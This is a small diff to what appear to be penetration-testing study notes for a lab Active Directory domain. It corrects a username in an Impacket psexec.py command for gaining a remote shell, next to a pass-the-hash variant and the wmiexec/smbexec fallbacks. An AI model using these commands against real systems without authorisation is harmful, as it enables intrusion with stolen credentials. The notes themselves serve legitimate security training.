@@ -48,7 +48,7 @@
 
 ## Gaining Shell Access
 - using psexec in msf  --- we can do this with password or hashes (NT:LM)
-- `psexec.py marvel.local/ppark:'passw0rd@123'@10.0.2.14`
+- `psexec.py marvel.local/pparker:'passw0rd@123'@10.0.2.14`
 - `psexec.py administrator@10.0.2.14 -hashes [hashes for administrator NT:LM]`
 - if psexec gets blocked you can use `wmiexec.py` or `smbexec.py`
 
